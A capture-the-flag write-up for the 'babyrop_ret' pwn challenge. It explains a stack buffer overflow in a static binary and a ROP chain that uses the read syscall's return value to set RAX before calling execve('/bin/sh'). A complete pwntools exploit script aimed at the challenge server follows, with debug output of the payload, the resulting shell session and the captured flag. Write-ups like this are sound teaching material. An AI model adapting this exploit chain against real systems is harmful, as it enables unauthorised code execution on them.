# babyrop_ret (pwn)

# Challenge description:

We are looking for a new ROP master.

Flag format: CTF{sha256}

# Flag proof:

> CTF{2018f15138242d74dbb1de38b89b3cdc34dd00cf0dce8aa4d57386f796cd6c00}
> 

# Summary:

The binary contains a buffer overflow exploit, but we have no provided function to jump to, and libc is not linked, so we need to syscall. We have in the binary gadgets for RDI, RSI and RDX, but not for RAX. The workaround I took is to call the `read` syscall with the number of bytes that I want to be placed in RAX, and this way I can read `/bin/sh` into memory and control the RAX register at the same time. After that, it is trivial to do an `execve` syscall

# Details:

We open the binary in IDA

We see 6 useful functions:

- main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-D0h] BYREF
  __int64 v5; // [rsp+8h] [rbp-C8h]
  __int64 v6; // [rsp+10h] [rbp-C0h]
  __int64 v7; // [rsp+18h] [rbp-B8h]
  __int64 v8; // [rsp+20h] [rbp-B0h]
  __int64 v9; // [rsp+28h] [rbp-A8h]
  __int64 v10; // [rsp+30h] [rbp-A0h]
  __int64 v11; // [rsp+38h] [rbp-98h]
  __int64 v12; // [rsp+40h] [rbp-90h]
  __int64 v13; // [rsp+48h] [rbp-88h]
  __int64 v14; // [rsp+50h] [rbp-80h]
  __int64 v15; // [rsp+58h] [rbp-78h]
  __int64 v16; // [rsp+60h] [rbp-70h]
  __int64 v17; // [rsp+68h] [rbp-68h]
  __int64 v18; // [rsp+70h] [rbp-60h]
  __int64 v19; // [rsp+78h] [rbp-58h]
  __int64 v20; // [rsp+80h] [rbp-50h]
  __int64 v21; // [rsp+88h] [rbp-48h]
  __int64 v22; // [rsp+90h] [rbp-40h]
  __int64 v23; // [rsp+98h] [rbp-38h]
  __int64 v24; // [rsp+A0h] [rbp-30h]
  __int64 v25; // [rsp+A8h] [rbp-28h]
  __int64 v26; // [rsp+B0h] [rbp-20h]
  __int64 v27; // [rsp+B8h] [rbp-18h]
  __int64 v28; // [rsp+C0h] [rbp-10h]
  char *v29; // [rsp+C8h] [rbp-8h]

  v29 = "Hello, ";
  *(_QWORD *)buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0LL;
  v19 = 0LL;
  v20 = 0LL;
  v21 = 0LL;
  v22 = 0LL;
  v23 = 0LL;
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  v27 = 0LL;
  v28 = 0LL;
  read(buf, 0x258uLL);
  HIBYTE(v28) = 0;
  write(v29, 8uLL);
  write(buf, 0xC8uLL);
  return 0;
}
```

- read

```c
__int64 __fastcall read(char *buf, size_t count)
{
  return sys_read(0, buf, count);
}
```

- write

```c
__int64 __fastcall write(const char *buf, size_t count)
{
  return sys_write(1u, buf, count);
}
```

- helper_rdi

```c
public helper_rdi
helper_rdi proc near
endbr64
xor     rax, rax
push    rax
pop     rdi
retn
helper_rdi endp
```

- helper_rsi

```c
public helper_rsi
helper_rsi proc near
endbr64
xor     rax, rax
push    rax
push    rax
pop     rsi
pop     r15
retn
helper_rsi endp
```

- helper_rdx

```c
public helper_rdx
helper_rdx proc near
endbr64
xor     rax, rax
push    rax
pop     rdx
retn
helper_rdx endp
```

Let's analyze the `main` function. We have a buffer of... more than 8 bytes (IDA saw part of the buffer as separate variables for some reason... maybe because the contents of the buffer is zeroed out qword by qword) and we read 0x258 bytes, so it's a buffer overflow. Let's `checksec` in gdb-peda:

```c
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

PIE is disabled, so we can hardcode addresses from the binary. NX is enabled so we can't execute shellcode from the stack unless we call `mprotect` on it. Libc is not mounted (we can see this by running `info proc map`):

```c
gdb-peda$ info proc map
process 2349
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/toma/unbreakable/babyrop_ret/babyrop
            0x401000           0x402000     0x1000     0x1000 /home/toma/unbreakable/babyrop_ret/babyrop
            0x402000           0x403000     0x1000     0x2000 /home/toma/unbreakable/babyrop_ret/babyrop
            0x404000           0x405000     0x1000     0x3000 /home/toma/unbreakable/babyrop_ret/babyrop
      0x7ffff7ff9000     0x7ffff7ffd000     0x4000        0x0 [vvar]
      0x7ffff7ffd000     0x7ffff7fff000     0x2000        0x0 [vdso]
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

So our only way of executing something useful is ROP-ing to a syscall. We already know that we have ROP gadgets for RDI, RSI and RDX, but what about RAX?

```c
gdb-peda$ ropsearch "pop RAX"
Searching for ROP gadget: 'pop RAX' in: binary ranges
Not found
gdb-peda$ ropsearch "mov RAX, ?"
Searching for ROP gadget: 'mov RAX, ?' in: binary ranges
Not found
gdb-peda$ ropsearch "mov EAX, ?"
Searching for ROP gadget: 'mov EAX, ?' in: binary ranges
Not found
```

Well, nothing. So we need to find another way of modifying RAX. Let's have a look at the `read`function:

```c
On success, the number of bytes read is returned (zero indicates end of file)
```

Similar for `write`

And the result of the syscall is conveniently returned in RAX. Here we have multiple options:

- Execute a `read` syscall with 59 bytes. Part of the 59 bytes should be `/bin/sh` so we do 2 things at once: read `/bin/sh` into memory and set RAX to 59, which is the syscall number for `execve`
- Execute a `mprotect` syscall, then read shellcode, jump to it and execute
- Execute a `sigreturn` syscall to have more control over the registers and do an `execve` syscall or a `mprotect` + shellcode

I went with the first option, as it seems the simplest.

Recap:

- Read `/bin/sh\x00`into memory, along with another 51 bytes, in order to have the command in memory and also set RAX to the `execve` syscall. For this we need a writeable address. Let's look at the data segment:

```c
.data:0000000000404000 ; ===========================================================================
.data:0000000000404000
.data:0000000000404000 ; Segment type: Pure data
.data:0000000000404000 ; Segment permissions: Read/Write
.data:0000000000404000 _data           segment align_32 public 'DATA' use64
.data:0000000000404000                 assume cs:_data
.data:0000000000404000                 ;org 404000h
.data:0000000000404000                 public taunts
.data:0000000000404000 taunts          dq offset aGoodLuckTrying
.data:0000000000404000                                         ; DATA XREF: LOAD:00000000004000F8↑o
.data:0000000000404000                                         ; "Good luck trying to reverse this thing!"
.data:0000000000404008                 dq offset aYouMustBePatie ; "You must be patient, this exploit is go"...
.data:0000000000404010                 dq offset aBrushUpOnYourR ; "Brush up on your ROP skills boai"
.data:0000000000404018                 dq offset aThisRopMightBe ; "This ROP might be a bit different"
.data:0000000000404020                 db    0
.data:0000000000404021                 db  41h ; A
.data:0000000000404022                 db  40h ; @
.data:0000000000404023                 db    0
.data:0000000000404024                 db    0
.data:0000000000404025                 db    0
.data:0000000000404026                 db    0
.data:0000000000404027                 db    0
.data:0000000000404027 _data           ends
.data:0000000000404027
```

- In the data segment we see some random strings that we can overwrite and have no impact on the program. And because PIE is disabled, we can hardcode the address
- Once we have 59 in RAX, execute an `execve` syscall, with the previously read `/bin/sh` as the first argument, and 0 in the next 2 arguments (no need for `argv` and `envp`, just the filename)
- Enjoy the shell

We put this into a script:

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF("./babyrop")
# r = process("./babyrop")
r = remote("34.159.235.104", 30041)
r.clean()

pop_rdi = p64(next(elf.search(asm("pop rdi; ret"), executable=True)))
pop_rsi = p64(next(elf.search(asm("pop rsi; pop r15; ret"), executable=True)))
pop_rdx = p64(next(elf.search(asm("pop rdx; ret"), executable=True)))
syscall = p64(next(elf.search(asm("syscall"), executable=True)))

writeable = p64(0x404000)

payload = b""
payload += b"A" * 216
payload += pop_rdi + writeable
payload += pop_rsi + p64(59) + p64(59)
payload += p64(elf.sym['read'])
payload += pop_rdi + writeable
payload += pop_rsi + p64(0) + p64(0)
payload += pop_rdx + p64(0)
payload += syscall

r.send(payload)
r.send(b"/bin/sh" + b"\x00" * 52)
r.interactive()
```

Output:

```c
[DEBUG] '/home/toma/unbreakable/babyrop_ret/babyrop' is statically linked, skipping GOT/PLT symbols
[*] '/home/toma/unbreakable/babyrop_ret/babyrop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 34.159.235.104 on port 30041: Done
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    pop rdi; ret
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-36f9aekz/step2 /tmp/pwn-asm-36f9aekz/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-36f9aekz/step3 /tmp/pwn-asm-36f9aekz/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    pop rsi; pop r15; ret
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-o_uvgw_y/step2 /tmp/pwn-asm-o_uvgw_y/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-o_uvgw_y/step3 /tmp/pwn-asm-o_uvgw_y/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    pop rdx; ret
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-07yebzz8/step2 /tmp/pwn-asm-07yebzz8/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-07yebzz8/step3 /tmp/pwn-asm-07yebzz8/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-klqpaive/step2 /tmp/pwn-asm-klqpaive/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-klqpaive/step3 /tmp/pwn-asm-klqpaive/step4
[DEBUG] Sent 0x148 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000d0  41 41 41 41  41 41 41 41  08 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    000000e0  00 40 40 00  00 00 00 00  23 10 40 00  00 00 00 00  │·@@·│····│#·@·│····│
    000000f0  3b 00 00 00  00 00 00 00  3b 00 00 00  00 00 00 00  │;···│····│;···│····│
    00000100  2a 10 40 00  00 00 00 00  08 10 40 00  00 00 00 00  │*·@·│····│··@·│····│
    00000110  00 40 40 00  00 00 00 00  23 10 40 00  00 00 00 00  │·@@·│····│#·@·│····│
    00000120  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000130  15 10 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00000140  48 10 40 00  00 00 00 00                            │H·@·│····│
    00000148
[DEBUG] Sent 0x3b bytes:
    00000000  2f 62 69 6e  2f 73 68 00  00 00 00 00  00 00 00 00  │/bin│/sh·│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000030  00 00 00 00  00 00 00 00  00 00 00                  │····│····│···│
    0000003b
[*] Switching to interactive mode
[DEBUG] Received 0xc8 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000c0  41 41 41 41  41 41 41 00                            │AAAA│AAA·│
    000000c8
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x62 bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libx32\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ ls home
[DEBUG] Sent 0x8 bytes:
    b'ls home\n'
[DEBUG] Received 0x8 bytes:
    b'babyrop\n'
babyrop
$ ls /home/babyrop
[DEBUG] Sent 0x11 bytes:
    b'ls /home/babyrop\n'
[DEBUG] Received 0xd bytes:
    b'babyrop\n'
    b'flag\n'
babyrop
flag
$ cat /home/babyrop/flag
[DEBUG] Sent 0x17 bytes:
    b'cat /home/babyrop/flag\n'
[DEBUG] Received 0x46 bytes:
    b'CTF{2018f15138242d74dbb1de38b89b3cdc34dd00cf0dce8aa4d57386f796cd6c00}\n'
CTF{2018f15138242d74dbb1de38b89b3cdc34dd00cf0dce8aa4d57386f796cd6c00}
$ 
[*] Interrupted
[*] Closed connection to 34.159.235.104 port 30041
```